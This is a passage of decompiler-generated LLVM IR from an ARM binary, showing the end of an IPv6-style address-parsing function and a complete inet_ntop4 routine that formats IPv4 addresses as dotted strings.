  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_12210, label %dec_label_pc_12230, label %dec_label_pc_12224

dec_label_pc_12224:                               ; preds = %entry
  %v7_12224 = icmp eq i32 %arg1, 10
  br i1 %v7_12224, label %dec_label_pc_12240, label %dec_label_pc_123f8

dec_label_pc_12230:                               ; preds = %entry
  store i32 %tmp, i32* @r0, align 4
  %v3_12238 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_12410

dec_label_pc_12240:                               ; preds = %dec_label_pc_12224
  %v2_12240 = ptrtoint i32* %stack_var_-56 to i32
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_1224c = bitcast i32* %stack_var_-56 to i8*
  %v4_1224c = call i32 @__GI_memset(i8* %v3_1224c, i32 0, i32 16)
  %v0_12250 = load i32, i32* @r5, align 4
  %v1_12250 = inttoptr i32 %v0_12250 to i8*
  %v2_12250 = load i8, i8* %v1_12250, align 1
  %v3_12250 = zext i8 %v2_12250 to i32
  store i32 %v3_12250, i32* %r3.global-to-local, align 4
  %v7_12254 = icmp eq i8 %v2_12250, 58
  store i32 %v4_1224c, i32* @r6, align 4
  %v2_1225c = add i32 %v4_1224c, 16
  store i32 %v2_1225c, i32* %r8.global-to-local, align 4
  br i1 %v7_12254, label %dec_label_pc_12264, label %dec_label_pc_12270

dec_label_pc_12264:                               ; preds = %dec_label_pc_12240
  %v1_12264 = add i32 %v0_12250, 1
  %v2_12264 = inttoptr i32 %v1_12264 to i8*
  %v3_12264 = load i8, i8* %v2_12264, align 1
  %v4_12264 = zext i8 %v3_12264 to i32
  store i32 %v4_12264, i32* %r3.global-to-local, align 4
  store i32 %v1_12264, i32* @r5, align 4
  %v7_12268 = icmp eq i8 %v3_12264, 58
  br i1 %v7_12268, label %dec_label_pc_12270, label %dec_label_pc_123f0

dec_label_pc_12270:                               ; preds = %dec_label_pc_12264, %dec_label_pc_12240
  %v0_1227c = phi i32 [ %v1_12264, %dec_label_pc_12264 ], [ %v0_12250, %dec_label_pc_12240 ]
  store i32 -37196, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_12278 = load i32, i32* @r4, align 4
  %v2_12278 = add i32 %v0_12278, -37196
  store i32 %v0_1227c, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v2_12278, i32* %stack_var_-64, align 4
  %v1_123543 = inttoptr i32 %v0_1227c to i8*
  %v2_123544 = load i8, i8* %v1_123543, align 1
  %v3_123545 = zext i8 %v2_123544 to i32
  store i32 %v3_123545, i32* @r4, align 4
  %v2_123586 = icmp eq i8 %v2_123544, 0
  br i1 %v2_123586, label %dec_label_pc_12360.thread, label %dec_label_pc_12290

dec_label_pc_12360.thread:                        ; preds = %dec_label_pc_12270
  store i32 %v4_1224c, i32* @r4, align 4
  br label %dec_label_pc_1238c

dec_label_pc_12290:                               ; preds = %dec_label_pc_12270, %dec_label_pc_12354.backedge.dec_label_pc_12290_crit_edge
  %v0_12294 = phi i32 [ %v3_12354, %dec_label_pc_12354.backedge.dec_label_pc_12290_crit_edge ], [ %v3_123545, %dec_label_pc_12270 ]
  %v2_12290 = phi i32 [ %v2_12290.pre, %dec_label_pc_12354.backedge.dec_label_pc_12290_crit_edge ], [ %v2_12278, %dec_label_pc_12270 ]
  store i32 %v2_12290, i32* @r0, align 4
  %v1_12294 = or i32 %v0_12294, 32
  %v2_12298 = call i32 @__GI_strchr(i32 %v2_12290, i32 %v1_12294)
  %v2_1229c = icmp eq i32 %v2_12298, 0
  %v0_122a0 = load i32, i32* @r5, align 4
  %v1_122a0 = add i32 %v0_122a0, 1
  store i32 %v1_122a0, i32* @r5, align 4
  br i1 %v2_1229c, label %dec_label_pc_122c4, label %dec_label_pc_122a8

dec_label_pc_122a8:                               ; preds = %dec_label_pc_12290
  %v2_122a8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_122a8, i32* %r2.global-to-local, align 4
  %v2_122ac = sub i32 %v2_12298, %v2_122a8
  %v1_122b0 = load i32, i32* @r7, align 4
  %v4_122b0 = mul i32 %v1_122b0, 16
  %v5_122b0 = or i32 %v4_122b0, %v2_122ac
  store i32 %v5_122b0, i32* @r7, align 4
  store i32 65535, i32* @r3, align 4
  %tmp36 = icmp ult i32 %v5_122b0, 65536
  br i1 %tmp36, label %dec_label_pc_12350, label %dec_label_pc_123f0

dec_label_pc_122c4:                               ; preds = %dec_label_pc_12290
  %v0_122c4 = load i32, i32* @r4, align 4
  %v7_122c4 = icmp eq i32 %v0_122c4, 58
  br i1 %v7_122c4, label %dec_label_pc_122cc, label %dec_label_pc_12324

dec_label_pc_122cc:                               ; preds = %dec_label_pc_122c4
  %v0_122cc = load i32, i32* %sb.global-to-local, align 4
  %v2_122cc = icmp eq i32 %v0_122cc, 0
  br i1 %v2_122cc, label %dec_label_pc_122d4, label %dec_label_pc_122e8

dec_label_pc_122d4:                               ; preds = %dec_label_pc_122cc
  %v0_122d4 = load i32, i32* %fp.global-to-local, align 4
  %v2_122d4 = icmp eq i32 %v0_122d4, 0
  br i1 %v2_122d4, label %dec_label_pc_122dc, label %dec_label_pc_123f0

dec_label_pc_122dc:                               ; preds = %dec_label_pc_122d4
  %v0_122dc = load i32, i32* @r6, align 4
  store i32 %v0_122dc, i32* %fp.global-to-local, align 4
  store i32 %v1_122a0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_12354.backedge

dec_label_pc_122e8:                               ; preds = %dec_label_pc_122cc
  %v1_122e8 = inttoptr i32 %v1_122a0 to i8*
  %v2_122e8 = load i8, i8* %v1_122e8, align 1
  %v3_122e8 = zext i8 %v2_122e8 to i32
  store i32 %v3_122e8, i32* %r3.global-to-local, align 4
  %v2_122ec = icmp eq i8 %v2_122e8, 0
  br i1 %v2_122ec, label %dec_label_pc_123f0, label %dec_label_pc_122f4

dec_label_pc_122f4:                               ; preds = %dec_label_pc_122e8
  %v0_122f4 = load i32, i32* @r6, align 4
  %v1_122f4 = add i32 %v0_122f4, 2
  store i32 %v1_122f4, i32* %r3.global-to-local, align 4
  %v1_122f8 = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_122f4, %v1_122f8
  br i1 %tmp37, label %dec_label_pc_123f0, label %dec_label_pc_12300

dec_label_pc_12300:                               ; preds = %dec_label_pc_122f4
  %v0_12300 = load i32, i32* @r7, align 4
  %v3_12300 = udiv i32 %v0_12300, 256
  store i32 %v3_12300, i32* %r2.global-to-local, align 4
  store i32 %v0_122f4, i32* %r3.global-to-local, align 4
  %v1_12308 = trunc i32 %v3_12300 to i8
  %v3_12308 = inttoptr i32 %v0_122f4 to i8*
  store i8 %v1_12308, i8* %v3_12308, align 1
  %v4_12308 = load i32, i32* %r3.global-to-local, align 4
  %v5_12308 = add i32 %v4_12308, 1
  store i32 %v5_12308, i32* @r3, align 4
  %v0_1230c = load i32, i32* @r7, align 4
  %v1_1230c = trunc i32 %v0_1230c to i8
  %v2_1230c = load i32, i32* @r6, align 4
  %v3_1230c = add i32 %v2_1230c, 1
  %v4_1230c = inttoptr i32 %v3_1230c to i8*
  store i8 %v1_1230c, i8* %v4_1230c, align 1
  store i32 0, i32* @r7, align 4
  %v0_12314 = load i32, i32* @r3, align 4
  %v1_12314 = add i32 %v0_12314, 1
  store i32 %v1_12314, i32* @r6, align 4
  %v0_12318 = load i32, i32* @r5, align 4
  store i32 %v0_12318, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_12354.backedge

dec_label_pc_12324:                               ; preds = %dec_label_pc_122c4
  %v7_12324 = icmp eq i32 %v0_122c4, 46
  br i1 %v7_12324, label %dec_label_pc_1232c, label %dec_label_pc_123f0

dec_label_pc_1232c:                               ; preds = %dec_label_pc_12324
  %v0_1232c = load i32, i32* @r6, align 4
  %v1_1232c = add i32 %v0_1232c, 4
  store i32 %v1_1232c, i32* @r4, align 4
  %v1_12330 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_1232c, %v1_12330
  br i1 %tmp38, label %dec_label_pc_123f0, label %dec_label_pc_12338

dec_label_pc_12338:                               ; preds = %dec_label_pc_1232c
  %v0_12338 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_12338, i32* @r0, align 4
  %v3_12340 = call i32 @inet_pton4(i32 %v0_12338, i32 %v0_1232c)
  %v5_12348 = icmp sgt i32 %v3_12340, 0
  br i1 %v5_12348, label %dec_label_pc_12338.dec_label_pc_1238c_crit_edge, label %dec_label_pc_123f0

dec_label_pc_12338.dec_label_pc_1238c_crit_edge:  ; preds = %dec_label_pc_12338
  %v0_123d0.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1238c

dec_label_pc_12350:                               ; preds = %dec_label_pc_122a8
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_12354.backedge

dec_label_pc_12354.backedge:                      ; preds = %dec_label_pc_12350, %dec_label_pc_122dc, %dec_label_pc_12300
  %v0_12354 = phi i32 [ %v1_122a0, %dec_label_pc_12350 ], [ %v1_122a0, %dec_label_pc_122dc ], [ %v0_12318, %dec_label_pc_12300 ]
  %v0_1236012 = phi i32 [ 1, %dec_label_pc_12350 ], [ 0, %dec_label_pc_122dc ], [ 0, %dec_label_pc_12300 ]
  %v1_12354 = inttoptr i32 %v0_12354 to i8*
  %v2_12354 = load i8, i8* %v1_12354, align 1
  %v3_12354 = zext i8 %v2_12354 to i32
  store i32 %v3_12354, i32* @r4, align 4
  %v2_12358 = icmp eq i8 %v2_12354, 0
  br i1 %v2_12358, label %dec_label_pc_12360, label %dec_label_pc_12354.backedge.dec_label_pc_12290_crit_edge

dec_label_pc_12354.backedge.dec_label_pc_12290_crit_edge: ; preds = %dec_label_pc_12354.backedge
  %v2_12290.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_12290

dec_label_pc_12360:                               ; preds = %dec_label_pc_12354.backedge
  %v0_12364.pre = load i32, i32* @r6, align 4
  %v2_12360 = icmp eq i32 %v0_1236012, 0
  store i32 %v0_12364.pre, i32* @r4, align 4
  br i1 %v2_12360, label %dec_label_pc_1238c, label %dec_label_pc_1236c

dec_label_pc_1236c:                               ; preds = %dec_label_pc_12360
  %v1_1236c = add i32 %v0_12364.pre, 2
  store i32 %v1_1236c, i32* %r3.global-to-local, align 4
  %v1_12370 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1236c, %v1_12370
  br i1 %tmp39, label %dec_label_pc_123f0, label %dec_label_pc_12378

dec_label_pc_12378:                               ; preds = %dec_label_pc_1236c
  store i32 %v0_12364.pre, i32* %r3.global-to-local, align 4
  %v0_1237c = load i32, i32* @r7, align 4
  %v3_1237c = udiv i32 %v0_1237c, 256
  store i32 %v3_1237c, i32* %r2.global-to-local, align 4
  %v1_12380 = trunc i32 %v3_1237c to i8
  %v3_12380 = inttoptr i32 %v0_12364.pre to i8*
  store i8 %v1_12380, i8* %v3_12380, align 1
  %v4_12380 = load i32, i32* %r3.global-to-local, align 4
  %v5_12380 = add i32 %v4_12380, 1
  store i32 %v5_12380, i32* @r3, align 4
  %v0_12384 = load i32, i32* @r7, align 4
  %v1_12384 = trunc i32 %v0_12384 to i8
  %v2_12384 = load i32, i32* @r6, align 4
  %v3_12384 = add i32 %v2_12384, 1
  %v4_12384 = inttoptr i32 %v3_12384 to i8*
  store i8 %v1_12384, i8* %v4_12384, align 1
  %v0_12388 = load i32, i32* @r3, align 4
  %v1_12388 = add i32 %v0_12388, 1
  store i32 %v1_12388, i32* @r4, align 4
  br label %dec_label_pc_1238c

dec_label_pc_1238c:                               ; preds = %dec_label_pc_12338.dec_label_pc_1238c_crit_edge, %dec_label_pc_12360.thread, %dec_label_pc_12360, %dec_label_pc_12378
  %v0_123d0.pre = phi i32 [ %v0_123d0.pre.pre, %dec_label_pc_12338.dec_label_pc_1238c_crit_edge ], [ %v4_1224c, %dec_label_pc_12360.thread ], [ %v0_12364.pre, %dec_label_pc_12360 ], [ %v1_12388, %dec_label_pc_12378 ]
  %v0_1238c = load i32, i32* %fp.global-to-local, align 4
  %v2_1238c = icmp eq i32 %v0_1238c, 0
  %v1_123d0.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1238c, label %dec_label_pc_123d0, label %dec_label_pc_12394

dec_label_pc_12394:                               ; preds = %dec_label_pc_1238c
  %v9_12394 = icmp eq i32 %v0_123d0.pre, %v1_123d0.pre
  %v2_12398 = sub i32 %v0_123d0.pre, %v0_1238c
  store i32 %v2_12398, i32* @ip, align 4
  br i1 %v9_12394, label %dec_label_pc_123f0, label %dec_label_pc_123b8.preheader

dec_label_pc_123b8.preheader:                     ; preds = %dec_label_pc_12394
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_123b8

dec_label_pc_123ac:                               ; preds = %dec_label_pc_123b8
  %v2_123c0 = sub i32 %v0_123cc, %v0_123c4
  %v0_123ac = load i32, i32* %fp.global-to-local, align 4
  %v2_123ac = add i32 %v0_123ac, %v2_123bc
  %v3_123ac = inttoptr i32 %v2_123ac to i8*
  %v4_123ac = load i8, i8* %v3_123ac, align 1
  %v6_123ac = zext i8 %v4_123ac to i32
  store i32 %v6_123ac, i32* @r3, align 4
  %v3_123b0 = inttoptr i32 %v2_123c0 to i8*
  store i8 %v4_123ac, i8* %v3_123b0, align 1
  %v0_123b4 = load i32, i32* @lr, align 4
  %v1_123b4 = trunc i32 %v0_123b4 to i8
  %v2_123b4 = load i32, i32* %fp.global-to-local, align 4
  %v3_123b4 = load i32, i32* @r1, align 4
  %v4_123b4 = add i32 %v3_123b4, %v2_123b4
  %v5_123b4 = inttoptr i32 %v4_123b4 to i8*
  store i8 %v1_123b4, i8* %v5_123b4, align 1
  %v0_123b8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_123b8.pre = load i32, i32* @ip, align 4
  %v1_123c0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_123b8

dec_label_pc_123b8:                               ; preds = %dec_label_pc_123b8.preheader, %dec_label_pc_123ac
  %v0_123cc = phi i32 [ %v1_123d0.pre, %dec_label_pc_123b8.preheader ], [ %v1_123c0.pre, %dec_label_pc_123ac ]
  %v1_123bc = phi i32 [ %v2_12398, %dec_label_pc_123b8.preheader ], [ %v1_123b8.pre, %dec_label_pc_123ac ]
  %v0_123c4 = phi i32 [ 1, %dec_label_pc_123b8.preheader ], [ %v0_123b8.pre, %dec_label_pc_123ac ]
  %v2_123b8 = sub i32 %v0_123c4, %v1_123bc
  %v4_123b8 = xor i32 %v0_123c4, %v1_123bc
  %v5_123b8 = xor i32 %v2_123b8, %v0_123c4
  %v6_123b8 = and i32 %v5_123b8, %v4_123b8
  %v7_123b8 = icmp slt i32 %v6_123b8, 0
  %v8_123b8 = icmp slt i32 %v2_123b8, 0
  %v9_123b8 = icmp eq i32 %v0_123c4, %v1_123bc
  %v2_123bc = sub i32 %v1_123bc, %v0_123c4
  store i32 %v2_123bc, i32* @r1, align 4
  %v1_123c4 = add i32 %v0_123c4, 1
  store i32 %v1_123c4, i32* %r2.global-to-local, align 4
  %v3_123c8 = xor i1 %v8_123b8, %v7_123b8
  %v4_123c8 = or i1 %v9_123b8, %v3_123c8
  br i1 %v4_123c8, label %dec_label_pc_123ac, label %dec_label_pc_123cc

dec_label_pc_123cc:                               ; preds = %dec_label_pc_123b8
  store i32 %v0_123cc, i32* @r4, align 4
  br label %dec_label_pc_123d0

dec_label_pc_123d0:                               ; preds = %dec_label_pc_1238c, %dec_label_pc_123cc
  %v0_123d0 = phi i32 [ %v0_123cc, %dec_label_pc_123cc ], [ %v0_123d0.pre, %dec_label_pc_1238c ]
  %v1_123d0 = phi i32 [ %v0_123cc, %dec_label_pc_123cc ], [ %v1_123d0.pre, %dec_label_pc_1238c ]
  %v9_123d0 = icmp eq i32 %v0_123d0, %v1_123d0
  br i1 %v9_123d0, label %dec_label_pc_123d8, label %dec_label_pc_123f0

dec_label_pc_123d8:                               ; preds = %dec_label_pc_123d0
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_12240, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_123e4 = call i32 @memcpy()
  br label %dec_label_pc_12410

dec_label_pc_123f0:                               ; preds = %dec_label_pc_122a8, %dec_label_pc_122d4, %dec_label_pc_122f4, %dec_label_pc_122e8, %dec_label_pc_12394, %dec_label_pc_12338, %dec_label_pc_12324, %dec_label_pc_123d0, %dec_label_pc_12264, %dec_label_pc_1236c, %dec_label_pc_1232c
  br label %dec_label_pc_12410

dec_label_pc_123f8:                               ; preds = %dec_label_pc_12224
  store i32 ptrtoint (i32* @global_var_fee8.455 to i32), i32* %r3.global-to-local, align 4
  %v0_123fc = call i32 @__aeabi_read_tp()
  %v3_12400 = load i16, i16* @global_var_222f0.75, align 2
  %v4_12400 = sext i16 %v3_12400 to i32
  store i32 %v4_12400, i32* %r3.global-to-local, align 4
  store i32 97, i32* %r2.global-to-local, align 4
  %v3_12408 = add i32 %v4_12400, %v0_123fc
  %v4_12408 = inttoptr i32 %v3_12408 to i32*
  store i32 97, i32* %v4_12408, align 4
  br label %dec_label_pc_12410

dec_label_pc_12410:                               ; preds = %dec_label_pc_123f0, %dec_label_pc_123d8, %dec_label_pc_12230, %dec_label_pc_123f8
  %v1_12418 = phi i32 [ 0, %dec_label_pc_123f0 ], [ 1, %dec_label_pc_123d8 ], [ %v3_12238, %dec_label_pc_12230 ], [ -1, %dec_label_pc_123f8 ]
  store i32 %v3_12204, i32* @r4, align 4
  store i32 %v6_12204, i32* @r5, align 4
  store i32 %v9_12204, i32* @r6, align 4
  store i32 %v12_12204, i32* @r7, align 4
  store i32 %v27_12204, i32* @lr, align 4
  ret i32 %v1_12418

; uselistorder directives
  uselistorder i32 %v2_123bc, { 1, 0 }
  uselistorder i32 %v2_123b8, { 1, 0 }
  uselistorder i32 %v0_123c4, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_123bc, { 1, 3, 0, 2 }
  uselistorder i32 %v0_123cc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_123d0.pre, { 0, 2, 1 }
  uselistorder i32 %v0_123d0.pre, { 2, 0, 1 }
  uselistorder i32 %v3_1237c, { 1, 0 }
  uselistorder i32 %v0_12364.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_12354, { 1, 0 }
  uselistorder i32 %v3_12300, { 1, 0 }
  uselistorder i32 %v0_122f4, { 1, 0, 2 }
  uselistorder i32 %v1_122a0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_12290, { 1, 0 }
  uselistorder i32 %v0_1227c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 2, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32)* @inet_pton4, { 1, 0 }
  uselistorder label %dec_label_pc_12410, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_123f0, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_123d0, { 1, 0 }
  uselistorder label %dec_label_pc_123b8, { 1, 0 }
  uselistorder label %dec_label_pc_1238c, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_12354.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12290, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_12504 = ptrtoint i32* %stack_var_-40 to i32
  %v2_124e4 = add i32 %v2_12504, -17
  br label %dec_label_pc_12504

dec_label_pc_12454:                               ; preds = %dec_label_pc_12504
  %v0_12454 = load i32, i32* %fp.global-to-local, align 4
  %v2_12454 = add i32 %v0_12454, %v1_12454
  %v3_12454 = inttoptr i32 %v2_12454 to i8*
  %v4_12454 = load i8, i8* %v3_12454, align 1
  %v6_12454 = zext i8 %v4_12454 to i32
  store i32 %v6_12454, i32* %r4.global-to-local, align 4
  %div4 = udiv i8 %v4_12454, 100
  %v2_1245c = zext i8 %div4 to i32
  store i32 %v2_1245c, i32* %r0.global-to-local, align 4
  %v1_12460 = or i8 %div4, 48
  %v3_12464 = add i32 %v2_12514, -17
  %v4_12464 = inttoptr i32 %v3_12464 to i8*
  store i8 %v1_12460, i8* %v4_12464, align 1
  %v0_12468 = load i32, i32* %r5.global-to-local, align 4
  %v1_12468 = add i32 %v0_12468, -17
  %v2_12468 = inttoptr i32 %v1_12468 to i8*
  %v3_12468 = load i8, i8* %v2_12468, align 1
  %v0_1246c = load i32, i32* %r6.global-to-local, align 4
  %v1_1246c = add i32 %v0_1246c, 1
  store i32 %v1_1246c, i32* %r6.global-to-local, align 4
  %v7_12474 = icmp eq i8 %v3_12468, 48
  %v0_1247c = load i32, i32* %r4.global-to-local, align 4
  %v0_12484 = load i32, i32* %fp.global-to-local, align 4
  %v1_12484 = load i32, i32* %sl.global-to-local, align 4
  %v2_12484 = add i32 %v1_12484, %v0_12484
  store i32 %v2_12484, i32* %sb.global-to-local, align 4
  %v2_1248c = udiv i32 %v0_1247c, 10
  %v1_12494 = urem i32 %v2_1248c, 256
  %v2_12498 = udiv i32 %v1_12494, 10
  %v3_12498 = urem i32 %v1_12494, 10
  store i32 %v2_12498, i32* %r0.global-to-local, align 4
  %v1_1249c = or i32 %v3_12498, 48
  store i32 %v1_1249c, i32* %r1.global-to-local, align 4
  br i1 %v7_12474, label %dec_label_pc_1248c, label %dec_label_pc_124b4

dec_label_pc_1248c:                               ; preds = %dec_label_pc_12454
  %v7_124a4 = icmp eq i32 %v1_1249c, 48
  br i1 %v7_124a4, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_1248c
  store i32 %v1_1246c, i32* %r7.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1248c, %bb
  %v1_124ac = trunc i32 %v1_1249c to i8
  store i8 %v1_124ac, i8* %v2_12468, align 1
  %v0_124e0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_124d0

dec_label_pc_124b4:                               ; preds = %dec_label_pc_12454
  %v2_12480 = add i32 %v1_1246c, %v2_12504
  %v1_124c8 = trunc i32 %v1_1249c to i8
  %v3_124c8 = add i32 %v2_12480, -17
  %v4_124c8 = inttoptr i32 %v3_124c8 to i8*
  store i8 %v1_124c8, i8* %v4_124c8, align 1
  %v0_124cc = load i32, i32* %r6.global-to-local, align 4
  %v1_124cc = add i32 %v0_124cc, 1
  store i32 %v1_124cc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_124d0

dec_label_pc_124d0:                               ; preds = %bb18, %dec_label_pc_124b4
  %v0_124e0 = phi i32 [ %v0_124e0.pre, %bb18 ], [ %v1_124cc, %dec_label_pc_124b4 ]
  %v0_124d0 = load i32, i32* %sb.global-to-local, align 4
  %v1_124d0 = inttoptr i32 %v0_124d0 to i8*
  %v2_124d0 = load i8, i8* %v1_124d0, align 1
  %tmp19 = urem i8 %v2_124d0, 10
  %v3_124d8 = zext i8 %tmp19 to i32
  store i32 %v2_12504, i32* %ip.global-to-local, align 4
  %v1_124e0 = add i32 %v0_124e0, 1
  store i32 %v1_124e0, i32* %r0.global-to-local, align 4
  %v1_124e8 = or i32 %v3_124d8, 48
  store i32 %v1_124e8, i32* %r1.global-to-local, align 4
  %v1_124ec = trunc i32 %v1_124e8 to i8
  %v3_124ec = add i32 %v2_124e4, %v0_124e0
  %v4_124ec = inttoptr i32 %v3_124ec to i8*
  store i8 %v1_124ec, i8* %v4_124ec, align 1
  %v0_124f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_124f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_124f0 = add i32 %v1_124f0, %v0_124f0
  %v3_124f8 = add i32 %v2_124f0, -17
  %v4_124f8 = inttoptr i32 %v3_124f8 to i8*
  store i8 46, i8* %v4_124f8, align 1
  %v0_124fc = load i32, i32* %r0.global-to-local, align 4
  %v1_124fc = add i32 %v0_124fc, 1
  store i32 %v1_124fc, i32* %r6.global-to-local, align 4
  %v0_12500 = load i32, i32* %sl.global-to-local, align 4
  %v1_12500 = add i32 %v0_12500, 1
  store i32 %v1_12500, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_12504

dec_label_pc_12504:                               ; preds = %entry, %dec_label_pc_124d0
  %v0_12510 = phi i32 [ 0, %entry ], [ %v1_124fc, %dec_label_pc_124d0 ]
  %v1_12454 = phi i32 [ 0, %entry ], [ %v1_12500, %dec_label_pc_124d0 ]
  store i32 %v2_12504, i32* %ip.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_12510, i32* %r7.global-to-local, align 4
  %v2_12514 = add i32 %v0_12510, %v2_12504
  store i32 %v2_12514, i32* %r5.global-to-local, align 4
  %v7_12518 = icmp sgt i32 %v1_12454, 3
  br i1 %v7_12518, label %dec_label_pc_1251c, label %dec_label_pc_12454

dec_label_pc_1251c:                               ; preds = %dec_label_pc_12504
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_12520 = ptrtoint i32* %stack_var_-57 to i32
  store i32 %v2_12520, i32* %r4.global-to-local, align 4
  %v3_12524 = add i32 %v2_12514, -18
  %v4_12524 = inttoptr i32 %v3_12524 to i8*
  store i8 0, i8* %v4_12524, align 1
  %tmp20 = bitcast i32* %stack_var_-57 to i8*
  store i32 %v2_12520, i32* %r0.global-to-local, align 4
  %v3_1252c = call i32 @strlen(i8* %tmp20)
  store i32 %v3_1252c, i32* %r0.global-to-local, align 4
  %v2_12530 = load i32, i32* %stack_var_-72, align 4
  %tmp = icmp ugt i32 %v3_1252c, %v2_12530
  br i1 %tmp, label %dec_label_pc_1253c, label %dec_label_pc_12558

dec_label_pc_1253c:                               ; preds = %dec_label_pc_1251c
  %v0_12540 = call i32 @__aeabi_read_tp()
  store i32 %v0_12540, i32* %r0.global-to-local, align 4
  %v3_12544 = load i16, i16* @global_var_222f0.75, align 2
  %v4_12544 = sext i16 %v3_12544 to i32
  %v0_1254c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1254c, i32* %r1.global-to-local, align 4
  %v3_12550 = add i32 %v4_12544, %v0_12540
  %v4_12550 = inttoptr i32 %v3_12550 to i32*
  store i32 28, i32* %v4_12550, align 4
  %v0_12568.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12568

dec_label_pc_12558:                               ; preds = %dec_label_pc_1251c
  store i32 %v2_12520, i32* @r1, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v2_12560 = inttoptr i32 %arg2 to i8*
  %v3_12560 = call i32 @strcpy(i8* %v2_12560, i32 %v2_12520)
  store i32 %v3_12560, i32* %r0.global-to-local, align 4
  store i32 %v3_12560, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12568

dec_label_pc_12568:                               ; preds = %dec_label_pc_1253c, %dec_label_pc_12558
  %v0_12568 = phi i32 [ %v0_12568.pre, %dec_label_pc_1253c ], [ %v3_12560, %dec_label_pc_12558 ]
  store i32 %v0_12568, i32* %r0.global-to-local, align 4
  ret i32 %v0_12568

; uselistorder directives
  uselistorder i32 %v0_12568, { 1, 0 }
  uselistorder i32 %v2_12520, { 1, 0, 2, 3 }
  uselistorder i32 %v2_12514, { 0, 2, 1 }
  uselistorder i32 %v1_12454, { 1, 0 }
  uselistorder i32 %v1_124e8, { 1, 0 }
  uselistorder i32 %v1_1249c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_12504, { 0, 4, 3, 2, 1 }
  uselistorder i32* %stack_var_-57, { 0, 2, 1 }
  uselistorder i32* %r7.global-to-local, { 3, 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 11, 7, 8, 9, 10, 1, 2, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1 }
  uselistorder i32 100, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 -17, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12568, { 1, 0 }
  uselistorder label %dec_label_pc_12504, { 1, 0 }
  uselistorder label %dec_label_pc_124d0, { 1, 0 }
